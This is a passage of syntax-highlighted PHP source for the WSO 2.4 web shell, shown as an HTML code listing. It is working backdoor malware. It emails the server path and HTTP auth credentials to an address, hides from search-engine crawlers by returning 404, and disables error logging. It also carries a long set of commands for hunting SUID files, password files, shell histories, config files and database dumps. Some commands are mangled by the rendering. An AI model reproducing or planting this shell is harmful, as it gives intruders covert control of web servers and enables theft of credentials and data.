<span class="lineno">  10</span> <span class="s2">/* &lt;![CDATA[ */</span>
<span class="lineno">  11</span> <span class="s2">(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName(&quot;</span><span class="nx">script</span><span class="s2">&quot;);l=b[b.length-1].previousSibling;a=l.getAttribute(&#39;data-cfemail&#39;);if(a){s=&#39;&#39;;r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();</span>
<span class="lineno">  12</span> <span class="s2">/* ]]&gt; */</span>
<span class="lineno">  13</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">  14</span> <span class="nv">$rar2</span> <span class="o">=</span> <span class="s2">&quot;Subject&quot;</span><span class="p">;</span>
<span class="lineno">  15</span> <span class="nv">$rar3</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_FILENAME&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br/&gt; User=&#39;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_AUTH_PW&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br/&gt;pass=&#39;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_AUTH_USER&#39;</span><span class="p">];</span>
<span class="lineno">  16</span> <span class="nv">$rar4</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_NAME&#39;</span><span class="p">];</span>
<span class="lineno">  17</span> <span class="nv">$rar5</span> <span class="o">=</span> <span class="s2">&quot;From: </span><span class="si">$rar4</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">  18</span> <span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$rar1</span><span class="p">,</span> <span class="nv">$rar2</span><span class="p">,</span> <span class="nv">$rar3</span><span class="p">,</span> <span class="nv">$rar4</span><span class="p">);</span>
<span class="lineno">  19</span> <span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">  20</span> <span class="nv">$color</span> <span class="o">=</span> <span class="s2">&quot;#66FF00&quot;</span><span class="p">;</span>
<span class="lineno">  21</span> <span class="nv">$default_action</span> <span class="o">=</span> <span class="s1">&#39;FilesMan&#39;</span><span class="p">;</span>
<span class="lineno">  22</span> <span class="nv">$default_use_ajax</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">  23</span> <span class="nv">$default_charset</span> <span class="o">=</span> <span class="s1">&#39;Windows-1251&#39;</span><span class="p">;</span>
<span class="lineno">  24</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">  25</span>     <span class="nv">$userAgents</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Google&quot;</span><span class="p">,</span> <span class="s2">&quot;Slurp&quot;</span><span class="p">,</span> <span class="s2">&quot;MSNBot&quot;</span><span class="p">,</span> <span class="s2">&quot;ia_archiver&quot;</span><span class="p">,</span> <span class="s2">&quot;Yandex&quot;</span><span class="p">,</span> <span class="s2">&quot;Rambler&quot;</span><span class="p">);</span>
<span class="lineno">  26</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nv">$userAgents</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/i&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">  27</span>         <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 404 Not Found&#39;</span><span class="p">);</span>
<span class="lineno">  28</span>         <span class="k">exit</span><span class="p">;</span>
<span class="lineno">  29</span>     <span class="p">}</span>
<span class="lineno">  30</span> <span class="p">}</span>
<span class="lineno">  31</span> <span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="lineno">  32</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">,</span> <span class="k">NULL</span><span class="p">);</span>
<span class="lineno">  33</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;log_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="lineno">  34</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="lineno">  35</span> <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">  36</span> <span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">  37</span> <span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;WSO_VERSION&#39;</span><span class="p">,</span> <span class="s1">&#39;2.4&#39;</span><span class="p">);</span>
<span class="lineno">  38</span> <span class="k">if</span> <span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">  39</span>     <span class="k">function</span> <span class="nf">WSOstripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  40</span>         <span class="k">return</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="o">?</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;WSOstripslashes&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">)</span> <span class="o">:</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>
<span class="lineno">  41</span>     <span class="p">}</span>
<span class="lineno">  42</span>     <span class="nv">$_POST</span> <span class="o">=</span> <span class="nx">WSOstripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
<span class="lineno">  43</span> <span class="p">}</span>
<span class="lineno">  44</span> <span class="k">function</span> <span class="nf">wsoLogin</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">  45</span>     <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;pre align=center&gt;&lt;form method=post&gt;Password: &lt;input type=password name=pass&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&lt;/pre&gt;&quot;</span><span class="p">);</span>
<span class="lineno">  46</span> <span class="p">}</span>
<span class="lineno">  47</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="p">]))</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$auth_pass</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$auth_pass</span><span class="p">)))</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">  48</span> <span class="k">else</span> <span class="nx">wsoLogin</span><span class="p">();</span>
<span class="lineno">  49</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span><span class="p">)</span> <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;win&#39;</span><span class="p">;</span>
<span class="lineno">  50</span> <span class="k">else</span> <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;nix&#39;</span><span class="p">;</span>
<span class="lineno">  51</span> <span class="nv">$safe_mode</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">);</span>
<span class="lineno">  52</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$safe_mode</span><span class="p">)</span> <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">  53</span> <span class="nv">$disable_functions</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">);</span>
<span class="lineno">  54</span> <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="lineno">  55</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span> <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
<span class="lineno">  56</span> <span class="nv">$cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="lineno">  57</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  58</span>     <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, &quot;</span> <span class="o">/</span> <span class="s2">&quot;, </span><span class="si">$home_cwd</span><span class="s2">);</span>
<span class="lineno">  59</span> <span class="s2">  </span><span class="si">$cwd</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\</span><span class="s2">&quot;, &quot;</span> <span class="o">/</span> <span class="s2">&quot;, </span><span class="si">$cwd</span><span class="s2">);</span>
<span class="lineno">  60</span> <span class="s2">}</span>
<span class="lineno">  61</span> <span class="s2">if( </span><span class="si">$cwd</span><span class="s2">[strlen(</span><span class="si">$cwd</span><span class="s2">) - 1] != &#39;/&#39; )</span>
<span class="lineno">  62</span> <span class="s2">  </span><span class="si">$cwd</span><span class="s2"> .= &#39;/&#39;;</span>
<span class="lineno">  63</span> 
<span class="lineno">  64</span> <span class="s2">if(!isset(</span><span class="si">$_SESSION[md5($_SERVER[&#39;HTTP_HOST&#39;]</span><span class="s2">) . &#39;ajax&#39;]))</span>
<span class="lineno">  65</span> <span class="s2">    </span><span class="si">$_SESSION[md5($_SERVER[&#39;HTTP_HOST&#39;]</span><span class="s2">) . &#39;ajax&#39;] = (bool)</span><span class="si">$GLOBALS[&#39;default_use_ajax&#39;]</span><span class="s2">;</span>
<span class="lineno">  66</span> 
<span class="lineno">  67</span> <span class="s2">if(</span><span class="si">$os</span><span class="s2"> == &#39;win&#39;)</span>
<span class="lineno">  68</span> <span class="s2">  </span><span class="si">$aliases</span><span class="s2"> = array(</span>
<span class="lineno">  69</span> <span class="s2">      &quot;</span><span class="nx">ListDirectory</span><span class="s2">&quot; =&gt; &quot;</span><span class="nb">dir</span><span class="s2">&quot;,</span>
<span class="lineno">  70</span> <span class="s2">      &quot;</span><span class="nx">Findindex</span> <span class="o">.</span> <span class="nx">phpincurrentdir</span><span class="s2">&quot; =&gt; &quot;</span><span class="nb">dir</span> <span class="o">/</span> <span class="nx">s</span> <span class="o">/</span> <span class="nx">w</span> <span class="o">/</span> <span class="nx">bindex</span> <span class="o">.</span> <span class="nx">php</span><span class="s2">&quot;,</span>
<span class="lineno">  71</span> <span class="s2">      &quot;</span><span class="nx">Find</span> <span class="o">*</span> <span class="nx">config</span> <span class="o">*</span> <span class="o">.</span> <span class="nx">phpincurrentdir</span><span class="s2">&quot; =&gt; &quot;</span><span class="nb">dir</span> <span class="o">/</span> <span class="nx">s</span> <span class="o">/</span> <span class="nx">w</span> <span class="o">/</span> <span class="nx">b</span> <span class="o">*</span> <span class="nx">config</span> <span class="o">*</span> <span class="o">.</span> <span class="nx">php</span><span class="s2">&quot;,</span>
<span class="lineno">  72</span> <span class="s2">      &quot;</span><span class="nx">Showactiveconnections</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">netstat</span> <span class="o">-</span> <span class="nx">an</span><span class="s2">&quot;,</span>
<span class="lineno">  73</span> <span class="s2">      &quot;</span><span class="nx">Showrunningservices</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">netstart</span><span class="s2">&quot;,</span>
<span class="lineno">  74</span> <span class="s2">      &quot;</span><span class="nx">Useraccounts</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">netuser</span><span class="s2">&quot;,</span>
<span class="lineno">  75</span> <span class="s2">      &quot;</span><span class="nx">Showcomputers</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">netview</span><span class="s2">&quot;,</span>
<span class="lineno">  76</span> <span class="s2">      &quot;</span><span class="nx">ARPTable</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">arp</span> <span class="o">-</span> <span class="nx">a</span><span class="s2">&quot;,</span>
<span class="lineno">  77</span> <span class="s2">      &quot;</span><span class="nx">IPConfiguration</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">ipconfig</span> <span class="o">/</span> <span class="nx">all</span><span class="s2">&quot;</span>
<span class="lineno">  78</span> <span class="s2">  );</span>
<span class="lineno">  79</span> <span class="s2">else</span>
<span class="lineno">  80</span> <span class="s2">  </span><span class="si">$aliases</span><span class="s2"> = array(</span>
<span class="lineno">  81</span> <span class="s2">          &quot;</span><span class="nx">Listdir</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">ls</span> <span class="o">-</span> <span class="nx">lha</span><span class="s2">&quot;,</span>
<span class="lineno">  82</span> <span class="s2">      &quot;</span><span class="nx">listfileattributesonaLinuxsecondextendedfilesystem</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">lsattr</span> <span class="o">-</span> <span class="nx">va</span><span class="s2">&quot;,</span>
<span class="lineno">  83</span> <span class="s2">          &quot;</span><span class="nx">showopenedports</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">netstat</span> <span class="o">-</span> <span class="nx">an</span> <span class="o">|</span> <span class="nx">grep</span> <span class="o">-</span> <span class="nx">ilisten</span><span class="s2">&quot;,</span>
<span class="lineno">  84</span> <span class="s2">        &quot;</span><span class="nx">processstatus</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">psaux</span><span class="s2">&quot;,</span>
<span class="lineno">  85</span> <span class="s2">      &quot;</span><span class="nx">Find</span><span class="s2">&quot; =&gt; &quot;&quot;,</span>
<span class="lineno">  86</span> <span class="s2">          &quot;</span><span class="nx">findallsuidfiles</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">typef</span> <span class="o">-</span> <span class="nx">perm</span> <span class="o">-</span> <span class="mo">04000</span> <span class="o">-</span> <span class="nx">ls</span><span class="s2">&quot;,</span>
<span class="lineno">  87</span> <span class="s2">          &quot;</span><span class="nx">findsuidfilesincurrentdir</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">find</span> <span class="o">.</span> <span class="o">-</span><span class="nx">typef</span> <span class="o">-</span> <span class="nx">perm</span> <span class="o">-</span> <span class="mo">04000</span> <span class="o">-</span> <span class="nx">ls</span><span class="s2">&quot;,</span>
<span class="lineno">  88</span> <span class="s2">          &quot;</span><span class="nx">findallsgidfiles</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">typef</span> <span class="o">-</span> <span class="nx">perm</span> <span class="o">-</span> <span class="mo">02000</span> <span class="o">-</span> <span class="nx">ls</span><span class="s2">&quot;,</span>
<span class="lineno">  89</span> <span class="s2">          &quot;</span><span class="nx">findsgidfilesincurrentdir</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">find</span> <span class="o">.</span> <span class="o">-</span><span class="nx">typef</span> <span class="o">-</span> <span class="nx">perm</span> <span class="o">-</span> <span class="mo">02000</span> <span class="o">-</span> <span class="nx">ls</span><span class="s2">&quot;,</span>
<span class="lineno">  90</span> <span class="s2">          &quot;</span><span class="nx">findconfig</span> <span class="o">.</span> <span class="nx">inc</span> <span class="o">.</span> <span class="nx">phpfiles</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">typef</span> <span class="o">-</span> <span class="nx">nameconfig</span> <span class="o">.</span> <span class="nx">inc</span> <span class="o">.</span> <span class="nx">php</span><span class="s2">&quot;,</span>
<span class="lineno">  91</span> <span class="s2">          &quot;</span><span class="nx">findconfig</span> <span class="o">*</span> <span class="nx">files</span><span class="s2">&quot; =&gt; &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">typef</span> <span class="o">-</span> <span class="nx">name\</span><span class="s2">&quot;config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;find config* files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;find all writable folders and files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">,</span> <span class="s2">&quot;find all writable folders and files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">,</span> <span class="s2">&quot;find all service.pwd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">,</span> <span class="s2">&quot;find service.pwd files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">,</span> <span class="s2">&quot;find all .htpasswd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">,</span> <span class="s2">&quot;find .htpasswd files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">,</span> <span class="s2">&quot;find all .bash_history files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">,</span> <span class="s2">&quot;find .bash_history files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">,</span> <span class="s2">&quot;find all .fetchmailrc files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">,</span> <span class="s2">&quot;find .fetchmailrc files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">,</span> <span class="s2">&quot;Locate&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;locate httpd.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">,</span> <span class="s2">&quot;locate vhosts.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate vhosts.conf&quot;</span><span class="p">,</span> <span class="s2">&quot;locate proftpd.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">,</span> <span class="s2">&quot;locate psybnc.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">,</span> <span class="s2">&quot;locate my.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate my.conf&quot;</span><span class="p">,</span> <span class="s2">&quot;locate admin.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate admin.php&quot;</span><span class="p">,</span> <span class="s2">&quot;locate cfg.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate cfg.php&quot;</span><span class="p">,</span> <span class="s2">&quot;locate conf.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate conf.php&quot;</span><span class="p">,</span> <span class="s2">&quot;locate config.dat files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.dat&quot;</span><span class="p">,</span> <span class="s2">&quot;locate config.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.php&quot;</span><span class="p">,</span> <span class="s2">&quot;locate config.inc files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.inc&quot;</span><span class="p">,</span> <span class="s2">&quot;locate config.inc.php&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.inc.php&quot;</span><span class="p">,</span> <span class="s2">&quot;locate config.default.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.default.php&quot;</span><span class="p">,</span> <span class="s2">&quot;locate config* files &quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config&quot;</span><span class="p">,</span> <span class="s2">&quot;locate .conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.conf&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;locate .pwd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.pwd&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;locate .sql files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.sql&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;locate .htpasswd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.htpasswd&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;locate .bash_history files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.bash_history&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;locate .mysql_history files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.mysql_history&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;locate .fetchmailrc files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.fetchmailrc&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;locate backup files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate backup&quot;</span><span class="p">,</span> <span class="s2">&quot;locate dump files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate dump&quot;</span><span class="p">,</span> <span class="s2">&quot;locate priv files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate priv&quot;</span><span class="p">);</span>
<span class="lineno">  92</span>     <span class="k">function</span> <span class="nf">wsoHeader</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">  93</span>         <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]))</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;default_charset&#39;</span><span class="p">];</span>
<span class="lineno">  94</span>         <span class="k">global</span> <span class="nv">$color</span><span class="p">;</span>
<span class="lineno">  95</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&#39;Content-Type&#39; content=&#39;text/html; charset=&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&lt;title&gt;We are the robot pirates.We have robot functions.But we have pirate duties.&lt;/title&gt;</span>
<span class="lineno">  96</span> <span class="s2">&lt;style&gt;</span>
<span class="lineno">  97</span> <span class="s2">body{</span>
<span class="lineno">  98</span> <span class="s2">background-attachment: fixed;</span>
<span class="lineno">  99</span> <span class="s2">background-image: url(http://i41.tinypic.com/dwxg60.png);</span>
<span class="lineno"> 100</span> <span class="s2">background-color:#0A0A0A;color:#e1e1e1;</span>
<span class="lineno"> 101</span> <span class="s2"> opacity: 0.7;</span>
<span class="lineno"> 102</span> <span class="s2">}</span>
<span class="lineno"> 103</span> <span class="s2">body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#FFFFFF; }</span>
<span class="lineno"> 104</span> <span class="s2">table.info{ color:#fff; background-color:#000000; }</span>
<span class="lineno"> 105</span> <span class="s2">span,a{ color: </span><span class="si">$color</span><span class="s2"> !important; }</span>
<span class="lineno"> 106</span> <span class="s2">span{ font-weight: bolder; }</span>
<span class="lineno"> 107</span> <span class="s2">h1{ border-left:5px solid </span><span class="si">$color</span><span class="s2">;padding: 2px 5px;font: 14pt Verdana;background-color:#000000;margin:0px;color:red; }</span>
<span class="lineno"> 108</span> <span class="s2">div.content{ padding: 5px;margin-left:5px;background-color:#333; }</span>
<span class="lineno"> 109</span> <span class="s2">a{ text-decoration:none; }</span>
<span class="lineno"> 110</span> <span class="s2">a:hover{ text-decoration:underline; }</span>
<span class="lineno"> 111</span> <span class="s2">.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }</span>
<span class="lineno"> 112</span> <span class="s2">.bigarea{ width:100%;height:250px; }</span>
<span class="lineno"> 113</span> <span class="s2">input,textarea,select{ margin:0;color:#fff;background-color:#000000;border:1px solid </span><span class="si">$color</span><span class="s2">; font: 9pt Monospace,&#39;Courier New&#39;; }</span>
<span class="lineno"> 114</span> <span class="s2">form{ margin:0px; }</span>
<span class="lineno"> 115</span> <span class="s2">#toolsTbl{ text-align:center; }</span>
<span class="lineno"> 116</span> <span class="s2">.toolsInp{ width: 300px }</span>
<span class="lineno"> 117</span> <span class="s2">.main th{text-align:left;background-color:#5e5e5e;}</span>
<span class="lineno"> 118</span> <span class="s2">.main tr:hover{background-color:#000000;}</span>
<span class="lineno"> 119</span> <span class="s2">.l1{background-color:#444}</span>
<span class="lineno"> 120</span> <span class="s2">.l2{background-color:#333}</span>
<span class="lineno"> 121</span> <span class="s2">pre{font-family:Courier,Monospace;}</span>
<span class="lineno"> 122</span> <span class="s2">&lt;/style&gt;</span>
<span class="lineno"> 123</span> <span class="s2">&lt;script&gt;</span>
<span class="lineno"> 124</span> <span class="s2">    var c_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="lineno"> 125</span> <span class="s2">    var a_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;</span>
<span class="lineno"> 126</span> <span class="s2">    var charset_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="lineno"> 127</span> <span class="s2">    var p1_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s2">&quot;</span>
<span class="lineno"> 128</span> <span class="s2">&quot;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="lineno"> 129</span> <span class="s2">    var p2_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="s2">&quot;</span>
